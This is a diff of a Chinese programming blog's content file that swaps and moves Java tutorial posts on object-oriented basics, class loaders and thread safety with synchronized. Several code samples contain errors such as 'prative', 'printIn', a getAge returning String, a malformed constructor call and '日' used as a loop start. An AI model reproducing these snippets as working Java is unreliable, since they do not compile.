-<td align="center">没有默认的初始化值，必须先定义，赋值，才能使用</td>
-</tr>
-</tbody></table>
+<p>java通过以下技术来实现安全机制</p>
 <ul>
-<li><strong>局部变量</strong>：在方法、构造方法或者语句块中定义的变量被称为局部变量。变量声明和初始化都是在方法中，方法结束后，变量就会自动销毁。</li>
-<li><strong>成员变量</strong>：成员变量是定义在类中，方法体之外的变量。这种变量在创建对象的时候实例化。成员变量可以被类中方法、构造方法和特定类的语句块访问。</li>
-<li><strong>类变量</strong>：类变量也声明在类中，方法体之外，但必须声明为 static 类型。</li>
+<li>语言设计特性(对数组边界检查，只进行合法的类型转换，无指针算法)</li>
+<li>访问控制机制，用于控制代码能够执行的功能</li>
+<li>代码签名，java代码的作者能够用加密算法来表明java代码的作者</li>
 </ul>
-<hr>
-<h2 id="创建对象"><a href="#创建对象" class="headerlink" title="创建对象"></a>创建对象</h2><p>格式:类名对象名 &#x3D; new 类名0;<br>范例: Phone p &#x3D; new Phone0;</p>
-<h2 id="使用对象"><a href="#使用对象" class="headerlink" title="使用对象"></a>使用对象</h2><ol>
-<li><strong>使用成员变量</strong><br>格式:对象名.变量名<br>范例:p.brand</li>
-<li><strong>使用成员方法</strong><br>格式:对象名.方法名()<br>范例: p.call()</li>
-</ol>
-<hr>
-<h1 id="封装"><a href="#封装" class="headerlink" title="封装"></a>封装</h1><h2 id="一、private关键字"><a href="#一、private关键字" class="headerlink" title="一、private关键字"></a>一、private关键字</h2><ul>
-<li>是一个权限修饰符</li>
-<li>可以修饰成员 (成员变量和成员方法)</li>
-<li>作用是保护成员不被别的类使用，被private修饰的成员只在本类中才能访问</li>
-</ul>
-<p>针对<code>private</code>修饰的成员变量，如果需要被其他类使用，提供相应的操作</p>
-<ul>
-<li>提供“<code>get变量名()</code>”方法，用于获取成员变量的值，方法用<code>public</code>修饰</li>
-<li>提供“<code>set变量名(参数)</code>”方法，用于设置成员变量的值，方法用<code>public</code>修饰</li>
-</ul>
-<h2 id="二、this关键字"><a href="#二、this关键字" class="headerlink" title="二、this关键字"></a>二、this关键字</h2><ol>
-<li><p>this修饰的变量用于指代成员变量<br>方法的形参如果与成员变量同名，不带this修饰的变量指的是形参，而不是成员变量<br>方法的形参没有与成员变量同名，不带this修饰的变量指的是成员变量</p>
-</li>
-<li><p>什么时候使用this呢? <strong>解决局部变量隐藏成员变量</strong></p>
-</li>
-<li><p>this 代表所在类的对象引用<br>记住:方法被哪个对象调用，this就代表哪个对象</p>
-</li>
-</ol>
-<h2 id="三、封装"><a href="#三、封装" class="headerlink" title="三、封装"></a>三、封装</h2><ol>
-<li><strong>封装概述</strong><br>是面向对象三大特征之一 (封装，继承，多态)<br>是面向对象编程语言对客观世界的横拟，客观世界里成员变量都是隐藏在对象内部的，外界是无法直接操作</li>
-<li><strong>封装规则</strong><br>将类的某些信息隐藏在类内部，不允许外部程序直接访问，而是通过该类提供的方法来实现对的冠信息的操作和访问成员变量private，提供对应的getXxx()&#x2F;setXxx()方法</li>
-<li><strong>好处</strong><br>通过方法来控制成员变量的操作，提高了代码的安全性<br>把代码用方法进行封装，提高了代码的复用性</li>
-</ol>
-<h2 id="四、构造方法"><a href="#四、构造方法" class="headerlink" title="四、构造方法"></a>四、构造方法</h2><p>在创建一个对象的时候，至少要调用一个构造方法。构造方法的名称必须与类同名，一个类可以有多个构造方法。</p>
-<p>下面是一个构造方法示例：</p>
-<p>public class Student{   </p>
-<p>​		 public Student(){ }     </p>
-<p>​		 public Student(String name){         </p>
-<p>​			&#x2F;&#x2F; 这个构造器仅有一个参数：name    } }</p>
-<p><strong>注意事项</strong>：</p>
+<p>一.类加载器</p>
+<p><a href="https://so.csdn.net/so/search?q=%E8%99%9A%E6%8B%9F%E6%9C%BA&spm=1001.2101.3001.7020">虚拟机</a>只加载程序需要的类文件，例如程序从MyProgram.Class执行，下面是虚拟机执行步骤：</p>
 <ol>
-<li><p>构造方法的创建</p>
-<p>如果没有定义构造方法，系统将给出一个认的无参数构造方法<br>如果定义了构造方法，系统将不再提供默认的构造方法</p>
-</li>
-<li><p>构造方法的重载<br>如果自定义了带参构造方法，还要使用无参数构造方法，就必须再写一个无参数构造方法</p>
-</li>
-<li><p>推荐的使用方式<br>无论是否使用，都手工书写无参数构造方法</p>
-</li>
+<li>虚拟机有一个用于加载类文件的机制，例如从磁盘文件加载或web请求访问，使用该价值加载MyProgram.Class</li>
+<li>如果MyProgram.Class拥有一个类型为另一个类的实例变量，或者拥有超类，那么这些类文件也被加载</li>
+<li>接着虚拟机执行MyProgram.Class的main方法，因为它是静态，无需实例化</li>
+<li>如果main方法或者调用其他方法使用到得类，这些类被加载</li>
 </ol>
-<h5 id="标准类制作"><a href="#标准类制作" class="headerlink" title="标准类制作"></a>标准类制作</h5><ol>
-<li>成员变量<br>使用private修饰</li>
-<li>构造方法<br>提供一个无参构造方法<br>提供一个带多个参数的构造方法</li>
-<li>成员方法<br>提供每一个成员变量对应的setXxx()&#x2F;getXxx()<br>提供一个显示对象信息的show()</li>
-<li>创建对象并为其成员变量值的两种方式<br>无参构造方法创建对象后使用setXxx()赋值<br>使用带参构造方法直接创建带有属性值的对象</li>
-</ol>
-<p>例子：</p>
-<h5 id="Student-java程序"><a href="#Student-java程序" class="headerlink" title="Student.java程序"></a>Student.java程序</h5><p>public class Student{   </p>
-<p>​		prative String name;&#x2F;&#x2F;成员变量</p>
-<p>​		prative int age;</p>
-<p>​		public Student() { }&#x2F;&#x2F;构造方法</p>
-<p>​		public Student(String name,int age){ </p>
-<p>​			this.name &#x3D; name;</p>
-<p>​			this.age &#x3D; age;}</p>
-<p>​		&#x2F;&#x2F;成员方法</p>
-<p>​		public void setName(String name){</p>
-<p>​			this.name &#x3D; name;}</p>
-<p>​		public String getName(){</p>
-<p>​			return name;}</p>
-<p>​		public void setAge(int age){</p>
-<p>​			this.age &#x3D; age;}</p>
-<p>​		public String getAge(){</p>
-<p>​			return age;}</p>
-<p>​		public void show(){</p>
-<p>​			System.out.println(name+”,”+age);}</p>
-<p>} </p>
-<h5 id="StudentDemo-java程序"><a href="#StudentDemo-java程序" class="headerlink" title="StudentDemo.java程序"></a>StudentDemo.java程序</h5><p>package com.XXX</p>
-<p>public class StudentDemo{</p>
-<p>​		public static void main(String[ ] args){</p>
-<p>​			&#x2F;&#x2F;无参构造方法创建对象后使用setXxx()赋值</p>
-<p>​			Student s1 &#x3D; new Student( );</p>
-<p>​			s1.setName(“xuan”);</p>
-<p>​			s1.setAge(18);</p>
-<p>​			s1.show();</p>
-<p>​			&#x2F;&#x2F;使用带参构造方法直接创建带有属性值的对象</p>
-<p>​			Student s2 &#x3D; new Student(“name:”xuan”,age:18);</p>
-<p>​			s2.show();</p>
-<p>​		}		</p>
-<p>}</p>
-<p><strong>运行结果</strong>：</p>
-<p>xuan,18</p>
-<p>xuan,18</p>
-<h1 id="Java-继承"><a href="#Java-继承" class="headerlink" title="Java 继承"></a>Java 继承</h1><hr>
-<h2 id="继承的概念"><a href="#继承的概念" class="headerlink" title="继承的概念"></a>继承的概念</h2><p>继承是面向对象的三大特征之一，可以使得子类具有父类的属性和方法，还可以在子类中重新定义，追加属性和方法</p>
+<p>  类加载机制至少拥有三个类加载器：</p>
 <ul>
-<li>格式:public class 子类名extends父类名}</li>
-<li>范例: public class Zi extends Fu<br>Fu:是类，也被称为基类、超类<br>Zi: 是子类，也被称为派生类</li>
+<li>引导类加载器 负责加载系统类，从JAR文件rt.jar中加载，它是虚拟机整体一部分。而且它是C语言实现的，另外引导类加载器没有ClassLoader对象</li>
+<li>扩展类加载器 用于从jre&#x2F;lib&#x2F;ext目录加载“标准的扩展”，</li>
+<li>系统类加载器(也陈为应用类加载器) 加载应用类，它是在CLASSPATH环境变量或者是-classpath命令行选项设置的类目录里或者是JAR&#x2F;ZIP文件里查找这些类。</li>
 </ul>
-<p>继承中子类的特点：</p>
-<p>子类可以有父类的内容，还可以有自己特有的内容</p>
-<h2 id="继承的好处和弊端"><a href="#继承的好处和弊端" class="headerlink" title="继承的好处和弊端"></a>继承的好处和弊端</h2><p><strong>继承好处</strong><br>提高了代码的复用性(多个类相同的成员可以放到同一个类中)<br>提高了代码的维护性(如果方法的代码需要修改，修改一处即可)<br><strong>继承弊端</strong><br>继承让类与类之间产生了关系，类的合性增强了，当父类发生变化时子类实现也不得不跟着变化，削弱了子类的独立性<br><strong>什么时候使用继承?</strong><br>继承体现的关系:is a<br>假设法:我有两个类A和B，如果他们满足A是B的一种，或者B是A的一种，就说明他们存在继承关系，这个时候就可以考虑使用继承来体现，否则就不滥用继承</p>
-<h2 id="继承中变量的访问特点"><a href="#继承中变量的访问特点" class="headerlink" title="继承中变量的访问特点"></a>继承中变量的访问特点</h2><p>在子类方法中访问一个变量</p>
-<ol>
-<li>子类局部范围找</li>
-<li>子类成员范围找</li>
-<li>父类成员范围找</li>
-<li>如果都没有就报错(不考虑父亲的父亲…)</li>
-</ol>
-<h2 id="继承类型"><a href="#继承类型" class="headerlink" title="继承类型"></a>继承类型</h2><p>需要注意的是 Java 不支持多继承，但支持多重继承。</p>
-<p><img src="https://www.runoob.com/wp-content/uploads/2013/12/java-extends-2020-12-08.png" alt="img"></p>
-<h2 id="继承关键字"><a href="#继承关键字" class="headerlink" title="继承关键字"></a>继承关键字</h2><p>继承可以使用 extends 和 implements 这两个关键字来实现继承，而且所有的类都是继承于 java.lang.Object，当一个类没有继承的两个关键字，则默认继承 Object（这个类在 <strong>java.lang</strong> 包中，所以不需要 <strong>import</strong>）祖先类。</p>
-<h3 id="extends关键字"><a href="#extends关键字" class="headerlink" title="extends关键字"></a>extends关键字</h3><p>在 Java 中，类的继承是单一继承，也就是说，一个子类只能拥有一个父类，所以 extends 只能继承一个类。</p>
-<p>public class Animal {<br>    private String name;<br>    private int id;<br>    public Animal(String myName, int myid) {<br>        &#x2F;&#x2F;初始化属性值<br>    }<br>    public void eat() {  &#x2F;&#x2F;吃东西方法的具体实现  }<br>    public void sleep() { &#x2F;&#x2F;睡觉方法的具体实现  }<br>} </p>
-<p>public class Penguin  extends  Animal{<br>}</p>
-<h3 id="implements关键字"><a href="#implements关键字" class="headerlink" title="implements关键字"></a>implements关键字</h3><p>使用 implements 关键字可以变相的使java具有<code>多继承</code>的特性，使用范围为类继承接口的情况，可以同时继承多个接口（接口跟接口之间采用逗号分隔）。</p>
-<p>public interface A {<br>    public void eat();<br>    public void sleep();<br>}</p>
-<p>public interface B {<br>    public void show();<br>}</p>
-<p>public class C implements A,B {<br>}</p>
-<h3 id="super-与-this-关键字"><a href="#super-与-this-关键字" class="headerlink" title="super 与 this 关键字"></a>super 与 this 关键字</h3><p>super关键字：我们可以通过super关键字来实现对父类成员的访问，用来引用当前对象的父类。</p>
-<p>this关键字：指向自己的引用。</p>
-<p><strong>实例</strong></p>
-<p>class Animal {<br>  void eat() {<br>    System.out.println(“animal : eat”);<br>  }<br>}</p>
-<p>class Dog extends Animal {<br>  void eat() {<br>    System.out.println(“dog : eat”);<br>  }<br>  void eatTest() {<br>    this.eat();   &#x2F;&#x2F; this 调用自己的方法<br>    super.eat();  &#x2F;&#x2F; super 调用父类方法<br>  }<br>}</p>
-<p>public class Test {<br>  public static void main(String[] args) {<br>    Animal a &#x3D; new Animal();<br>    a.eat();<br>    Dog d &#x3D; new Dog();<br>    d.eatTest();<br>  }<br>}</p>
-<p>输出结果为：</p>
-<p>animal : eat<br>dog : eat<br>animal : eat</p>
-<h3 id="final-关键字"><a href="#final-关键字" class="headerlink" title="final 关键字"></a>final 关键字</h3><p>final 可以用来修饰变量（包括类属性、对象属性、局部变量和形参）、方法（包括类方法和对象方法）和类。</p>
-<p><strong>final修饰的特点</strong></p>
-<ul>
-<li>修饰方法:表明该方法是最终方法，不能被重写</li>
-<li>修饰变量:表明该变量是常量，不能再次被赋值</li>
-<li>修饰类:表明该类是最终类，不能被继承</li>
-</ul>
-<p>声明类：</p>
-<p>final class 类名 {&#x2F;&#x2F;类体}</p>
-<p>声明方法：</p>
-<p>修饰符(public&#x2F;private&#x2F;default&#x2F;protected) final 返回值类型 方法名(){&#x2F;&#x2F;方法体}</p>
-<p><strong>注：</strong> final 定义的类，其中的属性、方法不是 final 的。</p>
-<p><strong>final修饰局部变量</strong></p>
-<p>变量是基本类型: final修饰指的是基本类型的数据值不能发生改变</p>
-<p>变量是引用类型: final修饰指的是引用类型的地址值不能发生改变，但是地址里面的内容是可以发生改变的</p>
-<h1 id="static-关键字"><a href="#static-关键字" class="headerlink" title="static 关键字"></a>static 关键字</h1><p>static 关键字是静态的意思，可以修饰成员方法，成员变量<br><strong>static 修饰的特点</strong></p>
-<ul>
-<li>被类的所有对象共享<br>这也是我们判断是否使用静态关键字的条件</li>
-<li>推荐使用类名调用</li>
-</ul>
-<p><strong>static 访问特点</strong></p>
-<p>静态成员方法只能访问静态成员和静态成员方法</p>
-<h1 id="Java-包"><a href="#Java-包" class="headerlink" title="Java 包"></a>Java 包</h1><p>包主要用来对类和接口进行分类管理</p>
-<p>包的定义格式</p>
-<p>格式：package 包名；</p>
-<p>范例：package com.first;</p>
-<h2 id="import-语句-导包"><a href="#import-语句-导包" class="headerlink" title="import 语句(导包)"></a>import 语句(导包)</h2><p>在 Java 中，如果给出一个完整的限定名，包括包名、类名，那么 Java 编译器就可以很容易地定位到源代码或者类。import 语句就是用来提供一个合理的路径，使得编译器可以找到某个类。</p>
-<p>例如，下面的命令行将会命令编译器载入 java_installation&#x2F;java&#x2F;io 路径下的所有类</p>
-<p>import java.io.*;(import 包名)</p>
+<h1 id="Java线程安全"><a href="#Java线程安全" class="headerlink" title="Java线程安全"></a>Java线程安全</h1><p>一、什么是线程安全</p>
+<p>想给出一个线程安全的确切定义是复杂的，但我们可以这样认为：<br>如果多线程环境下代码运行的结果是符合我们预期的，即在单线程环境应该的结果，则说这个程序是线程安全的</p>
+<p>🌰栗子</p>
+<pre><code>package Thread;
+ 
+public class demo77 &#123;
+    private static int count;
+    public static void main(String[] args) throws InterruptedException &#123;
+        Thread t1 = new Thread(() -&gt; &#123;
+            for (int i = 0; i &lt; 5000; i++) &#123;
+                count++;
+            &#125;
+        &#125;);
+        Thread t2 = new Thread(() -&gt; &#123;
+            for (int i = 0; i &lt; 5000; i++) &#123;
+                count++;
+            &#125;
+        &#125;);
+        t1.start(); // 两个线程在创建好了后，线程所对应的PCB加入到系统链表，参与系统调度
+        t2.start();
+        // 让主线程main等t1、t2执行完了再接着往下走
+        t1.join();
+        t2.join();
+        System.out.println(count);
+    &#125;
+&#125;
+</code></pre>
+<p> 想这样，在多线程情况下，程序的运行结果不符合我们的预期，这被称为线程不安全</p>
+<p>二、造成线程不安全的原因 </p>
+<p>根本原因：操作系统的随机调度执行，抢占式执行 </p>
+<pre><code>还有：我们可以看到我们的count是一个全局变量，我们的线程t1、线程t2对count变量同时都进行了修改——++操作（为什么说是同时呢，因为我们的t1线程、t2线程在创建完了后就参与到系统调度，由系统随机分配线程的执行，可能是t2线程先执行10个指令然后t1再执行10个指令，相当于是同时）
+</code></pre>
+<p>那么我们就改一下代码让t1、t2分批次对count修改不就行了吗？</p>
+<pre><code>package Thread;
+ 
+public class demo77 &#123;
+    private static int count;
+    public static void main(String[] args) throws InterruptedException &#123;
+        Thread t1 = new Thread(() -&gt; &#123;
+            for (int i = 0; i &lt; 5000; i++) &#123;
+                count++;
+            &#125;
+ 
+        &#125;);
+        Thread t2 = new Thread(() -&gt; &#123;
+            try &#123;
+                t1.join();// 等t1线程执行完了，t2线程再执行
+            &#125; catch (InterruptedException e) &#123;
+                e.printStackTrace();
+            &#125;
+            for (int i = 0; i &lt; 5000; i++) &#123;
+                count++;
+            &#125;
+        &#125;);
+        t1.start(); // 两个线程在创建好了后，线程所对应的PCB加入到系统链表，参与系统调度
+        t2.start();
+ 
+        t2.join(); // 等t2线程执行完了，主线程main再接着执行，执行顺序：t1-&gt;t2-&gt;打印count
+        System.out.println(count);
+    &#125;
+&#125;
+</code></pre>
+<p>大家有没有想过为什么多个线程同时执行count++的时候就会出现BUG呢？</p>
+<p>这是因为我们多个线程同时对同一变量修改的所造成的BUG往往和我们操作的原子性有关！！！这时候的操作往往不是一个整体，多个线程并发执行这些操作就可能出现一些问题</p>
+<p>如果我们在变量修改过程中，操作是原子的——只是对应一个机器指令，那么即使是多个线程同时对同一个变量修改也不一定会造成BUG,但也可能造成BUG——要看具体的业务场景</p>
+<p>总之我们要避免多个线程同时对同一个变量来操作</p>
+<p>🍑 对原子性在多线程并发执行中出现问题的分析</p>
+<p>🔔🔔注意：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">像 count++ 其实一行代码, 对应三个机器指令!</span><br><span class="line">1)从内存读取数据到 CPU load</span><br><span class="line">2)在 CPU 寄存器中,完成加法运算 add</span><br><span class="line">3)把寄存器的数据写回到内存中 save</span><br><span class="line">这几个步骤单线程下执行,没有任何问题</span><br><span class="line">如果是多线程并发执行,这个就不一定了!!</span><br></pre></td></tr></table></figure>
+
+<p>当我们执行t1.start()、t2.start()后，t1线程和t2线程就在操作系统内核中创建出来了，t1、t2线程就参与到了系统调度当中</p>
+<p>而调度是随机的——他可能先让t1执行几个指令，然后t2再执行几个指令、最后再把CPU的控制权交给t1。</p>
+<p>于是因为系统的调度是随机的（这是罪魁祸首，但我们无法改变），当我们多个线程同时执行一些不是整体的操作的时候（++或–）由于并发就会产生一些问题</p>
+<p> <strong>🌰栗子一</strong></p>
+<p><img src="https://img-blog.csdnimg.cn/15ac811137144c5abc01c49068c5a363.png" alt="img"></p>
+<p><strong>🌰栗子二</strong> </p>
+<p><img src="https://img-blog.csdnimg.cn/2cb8f0784e024604a6c09d38882f0676.png" alt="img"></p>
+<p>为什么会产生上面的BUG呢？</p>
+<p>就是因为我们的++操作不是一个整体，是一个由多个指令所组成的操作 </p>
+<p>解决方案：也是加锁：“synchronized”,意味着把这三条指令打包成了一组指令，然后把这一组指令看出成一条指令了，类似于数学里的“整体代换”思想。</p>
+<p> <img src="https://img-blog.csdnimg.cn/82dc94c8208f479e86508569793a36be.png" alt="img"></p>
+<p> 首先我们要明白加锁操作都是针对某一个对象来进行的（加锁本质就是给对象头里设置个标记），加锁有以下几种形式</p>
+<p>形式一、 </p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public class demo7777 &#123;</span><br><span class="line">	public static Object object1 = new Object();</span><br><span class="line">	public static Object object2 = new Object();</span><br><span class="line">	public static void main(String[] args) &#123;</span><br><span class="line">		Thread t1 = new Thread(() -&gt;&#123;</span><br><span class="line">			synchronized (object1)&#123;//对object1对象进行了加锁操作</span><br><span class="line">				System.out.println(&quot;t1线程start&quot;);</span><br><span class="line">				try &#123;</span><br><span class="line">						Thread.sleep( millis: 1000);</span><br><span class="line">				&#125; catch (InterruptedException e)&#123;</span><br><span class="line">					e.printStackTrace();</span><br><span class="line">				&#125;</span><br><span class="line">				System.out.println(&quot;t1线程finish&quot;);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;);</span><br><span class="line">t1.start();</span><br></pre></td></tr></table></figure>
+
+<p> 形式二、</p>
+<pre><code>package Thread;
+ 
+class Counter &#123;
+    public static int count;
+//    public synchronized void increase() &#123;
+//        ++count; 这两种写法视为是等价的
+//    &#125;
+    public void increase() &#123;
+        synchronized (this) &#123; // 这里this可以是任意对象，this可以有多个Counter counter1 = new Counter(), Counter counter2 = new Counter();
+            ++count;
+        &#125;
+    &#125;
+&#125;
+public class demo777 &#123;
+ 
+    public static void main(String[] args) throws InterruptedException &#123;
+        Counter counter1 = new Counter();
+        Counter counter2 = new Counter();
+        Thread t1 = new Thread(() -&gt; &#123;
+            for (int i = 0; i &lt; 5000; i++) &#123;
+                counter1.increase();
+            &#125;
+        &#125;);
+        Thread t2 = new Thread(() -&gt; &#123;
+            for (int i = 0; i &lt; 5000; i++) &#123;
+                counter1.increase();
+            &#125;
+            // 多个线程去调用这个increase方法，其实就是针对这个Counter对象counter1来进行加锁
+            // 如果一个线程t1获取到了该对象counter1的锁，那么另一个线程t2就要等到counter1对应的锁开了后（t1线程执行完该锁里的内容——++操作）t2才能执行++操作
+            // 此时++操作相当于是成为了一个整体（相当于一个指令，当一个线程再执行这个加锁的整体的指令的时候，另一个线程只能阻塞等待）
+        &#125;);
+        t1.start();
+        t2.start();
+        t1.join();
+        t2.join(); // 确保线程t1和线程t2都执行完了，main主线程再接着执行——输出count
+        System.out.println(Counter.count); // 输出10000
+    &#125;
+&#125;
+</code></pre>
+<p>形式三、 </p>
+<p> 加锁本质 就是给对象头里设置个标记,它的成员对应的对象的对象头不受影响</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public synchronized static void func1() &#123;</span><br><span class="line">&#125;</span><br><span class="line">public static void func2() &#123;</span><br><span class="line">	synchronized(Counter.class)&#123;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>使用类对象加锁,和类里有啥成员没关系~~<br>synchronized static、Counter.class这俩写法视为是等价的!!<br>类对象是整个程序里唯一的!!<br>这样加锁,但凡是调用到 func1 和 func2，之间都会产生竞争!!</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">class Counter1 &#123;</span><br><span class="line">	public static int count;</span><br><span class="line">	public synchronized static void increase() &#123;</span><br><span class="line">		++count;</span><br><span class="line">	&#125;</span><br><span class="line">public class demo77777 </span><br><span class="line">	public static void main(String[] args) &#123;</span><br><span class="line">		Counter1 counter1 = new Counter1();</span><br><span class="line">		Thread t1 = new Thread(() -&gt;&#123;</span><br><span class="line">			for (int i = 日; i &lt; 500; i++) &#123;</span><br><span class="line">				System.out.println(&quot;t1 start&quot;);</span><br><span class="line">				Counter1.increase();</span><br><span class="line">				System.out.printin(&quot;t1 finish&quot;);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;);</span><br><span class="line">		t1.start();</span><br></pre></td></tr></table></figure>
+
+<p>当我们给不同的对象上锁后，如果用住房来比喻</p>
+<pre><code>不同的房间相当于是不同的对象，不同的线程相当于是不同的客人
+
+如果房间1住了客人A，那么房间1就上了锁，客人B就需要等客人A不再住房间1（开了锁）然后客人B才能住房间1；或者客人B住其他的房间（其他的对象，没上锁的）
+
+package Thread;
+// 测试线程竞争，对锁的竞争
+public class demo7777 &#123;
+    public static Object object1 = new Object();
+    public static Object object2 = new Object();
+    public static void main(String[] args) &#123;
+        Thread t1 = new Thread(() -&gt; &#123;
+            // 针对object1对象进行加锁，加锁操作是针对某一个对象来进行的
+            synchronized (object1) &#123;
+                System.out.println(&quot;t1线程start&quot;);
+                try &#123;
+                    Thread.sleep(1000);
+                &#125; catch (InterruptedException e) &#123;
+                    e.printStackTrace();
+                &#125;
+                System.out.println(&quot;t1线程finish&quot;);
+            &#125;
+        &#125;);
+        t1.start();
+        Thread t2 = new Thread(() -&gt; &#123;
+            synchronized (object1) &#123;  // 针对object1对象来进行加锁操作
+                System.out.println(&quot;t2线程start&quot;);
+                try &#123;
+                    Thread.sleep(1000);
+                &#125; catch (InterruptedException e) &#123;
+                    e.printStackTrace();
+                &#125;
+                System.out.println(&quot;t2线程finish&quot;);
+            &#125;
+        &#125;);
+        t2.start();
+    &#125;
+&#125;
+</code></pre>
+<p>无论是使用哪种用法,使用 synchronized 的时候都是要明确锁对象!(明确是对哪个对象加锁)</p>
+<p>只有当两个线程针对同一个对象加锁的时候,才会发生竞争</p>
+<p>如果是两个线程针对不同对象加锁,则没有竞争~</p>
+<p>我们上面就是两个线程t1和t2同时对object1这个对象进行了加锁，然后t1与t2直接就产生了竞争。从上述代码的实现过程中我们也可以看到，等到t1线程执行完了后，t2线程才开始执行。</p>
+<p>但如果是两个线程对不同的对象进行加锁，则没有竞争（就像两个客人（两个线程）住不同的房间（不同的对象）当然不会发生竞争。</p>
+<pre><code>package Thread;
+// 测试线程竞争，对锁的竞争
+public class demo7777 &#123;
+    public static Object object1 = new Object();
+    public static Object object2 = new Object();
+    public static void main(String[] args) &#123;
+        Thread t1 = new Thread(() -&gt; &#123;
+            synchronized (object1) &#123; // 针对object1对象来进行加锁，加锁操作是针对一个对象来进行的
+                System.out.println(&quot;t1线程start&quot;);
+                try &#123;
+                    Thread.sleep(1000);
+                &#125; catch (InterruptedException e) &#123;
+                    e.printStackTrace();
+                &#125;
+                System.out.println(&quot;t1线程finish&quot;);
+            &#125;
+        &#125;);
+        t1.start();
+        Thread t2 = new Thread(() -&gt; &#123;
+            synchronized (object2) &#123; // 针对object2对象进行加锁
+                System.out.println(&quot;t2线程start&quot;);
+                try &#123;
+                    Thread.sleep(1000);
+                &#125; catch (InterruptedException e) &#123;
+                    e.printStackTrace();
+                &#125;
+                System.out.println(&quot;t2线程finish&quot;);
+            &#125;
+        &#125;);
+        t2.start();
+    &#125;
+&#125;
+</code></pre>
+<p> 两个线程可以做到同时执行</p>
 ]]></content>
       <tags>
         <tag>Java</tag>
@@ -2317,620 +2415,223 @@
       </tags>
   </entry>
   <entry>
-    <title>HTML</title>
-    <url>/2023/08/08/HTML/</url>
-    <content><![CDATA[<h1 id="html基本元素标签"><a href="#html基本元素标签" class="headerlink" title="html基本元素标签"></a>html基本元素标签</h1><span id="more"></span>
+    <title>Java面向对象</title>
+    <url>/2023/07/27/Java3/</url>
+    <content><![CDATA[<h1 id=""><a href="#" class="headerlink" title=""></a></h1><span id="more"></span>
 
-<ol>
-<li><p><code>&lt;html&gt;</code>：HTML网页的根标签，表示一个HTML文档的开始和结束</p>
+<h1 id="Java-对象和类"><a href="#Java-对象和类" class="headerlink" title="Java 对象和类"></a>Java 对象和类</h1><ul>
+<li><p><strong>类和对象的关系</strong><br><strong>类</strong>:类是对现实生活中一类具有共同属性和行为的事物的抽象<br><strong>对象</strong>:是能够看得到摸的着的真实存在的实体</p>
 </li>
-<li><p><code>&lt;head&gt;</code>：HTML文档的头部，用于描述文档的元数据、样式等信息</p>
+<li><p><strong>类的定义</strong><br><strong>类的重要性</strong>:是Java程序的基本组成单位<br><strong>类是什么</strong>:是对现实生活中一类具有共同属性和行为的事物的抽象，确定对象将会拥有的属性和行为</p>
+<p><strong>类的特点</strong>：类是对象的数据类型，是具有相同属性和行为的事物的抽象</p>
+<p><strong>类的组成</strong>:属性和行为<br><strong>属性</strong>:在类中通过成员变量来体现(类中方法外的变量)<br><strong>行为</strong>:在类中通过成员方法来体现(和前面的方法相比去掉static关键字即可)</p>
 </li>
-<li><p><code>&lt;title&gt;</code>：HTML文档的标题标签，用于在浏览器标签栏中显示文档的标题</p>
+<li><p><strong>对象的定义</strong></p>
+<p>看看周围真实的世界，会发现身边有很多对象，车，手机，人等等。所有这些对象都有自己的属性和行为。</p>
 </li>
-<li><p><code>&lt;body&gt;</code>：HTML文档的主体部分，包含了网页的实际内容</p>
+</ul>
+<p>​       拿一个手机来举例，它的属性有：品牌、价格，行为有：打电话、发短信。</p>
+<p>​       软件对象也有属性和行为。行为通过方法体现。</p>
+<p>​       在软件开发中，方法操作对象内部状态的改变，对象的相互调用也是通过方法来完成。</p>
+<h2 id="Java-中的类"><a href="#Java-中的类" class="headerlink" title="Java 中的类"></a>Java 中的类</h2><p>类可以看成是创建 Java 对象的模板。</p>
+<p>pubIic class Phone {</p>
+<p>​		&#x2F;&#x2F;成员变量</p>
+<p>​		String brand;</p>
+<p>​		int price;</p>
+<p>​		&#x2F;&#x2F;成员方法</p>
+<p>​		public void call(){</p>
+<p>​			System.out.printIn(“打电话”);}<br>​		public void sendMessage(){</p>
+<p>​			System.out,pnintIn(“发短信”);}</p>
+<p>}</p>
+<p><strong>成员变量和局部变量的区别</strong></p>
+<table>
+<thead>
+<tr>
+<th align="center">区别</th>
+<th align="center">成员变量</th>
+<th align="center">局部变量</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">类中位置不同</td>
+<td align="center">类中方法外</td>
+<td align="center">方法内或者方法声明上</td>
+</tr>
+<tr>
+<td align="center">内存中位置不同</td>
+<td align="center">堆内存</td>
+<td align="center">栈内存</td>
+</tr>
+<tr>
+<td align="center">生命周期不同</td>
+<td align="center">随着对象的存在而存在，随看对象的消失而消失</td>
+<td align="center">随着方法的调用而存在，随着方法的调用完毕而消失</td>
+</tr>
+<tr>
+<td align="center">初始化值不同</td>
+<td align="center">有默认的初始化值</td>
+<td align="center">没有默认的初始化值，必须先定义，赋值，才能使用</td>
+</tr>
+</tbody></table>
+<ul>
+<li><strong>局部变量</strong>：在方法、构造方法或者语句块中定义的变量被称为局部变量。变量声明和初始化都是在方法中，方法结束后，变量就会自动销毁。</li>
+<li><strong>成员变量</strong>：成员变量是定义在类中，方法体之外的变量。这种变量在创建对象的时候实例化。成员变量可以被类中方法、构造方法和特定类的语句块访问。</li>
+<li><strong>类变量</strong>：类变量也声明在类中，方法体之外，但必须声明为 static 类型。</li>
+</ul>
+<hr>
+<h2 id="创建对象"><a href="#创建对象" class="headerlink" title="创建对象"></a>创建对象</h2><p>格式:类名对象名 &#x3D; new 类名0;<br>范例: Phone p &#x3D; new Phone0;</p>
+<h2 id="使用对象"><a href="#使用对象" class="headerlink" title="使用对象"></a>使用对象</h2><ol>
+<li><strong>使用成员变量</strong><br>格式:对象名.变量名<br>范例:p.brand</li>
+<li><strong>使用成员方法</strong><br>格式:对象名.方法名()<br>范例: p.call()</li>
+</ol>
+<hr>
+<h1 id="封装"><a href="#封装" class="headerlink" title="封装"></a>封装</h1><h2 id="一、private关键字"><a href="#一、private关键字" class="headerlink" title="一、private关键字"></a>一、private关键字</h2><ul>
+<li>是一个权限修饰符</li>
+<li>可以修饰成员 (成员变量和成员方法)</li>
+<li>作用是保护成员不被别的类使用，被private修饰的成员只在本类中才能访问</li>
+</ul>
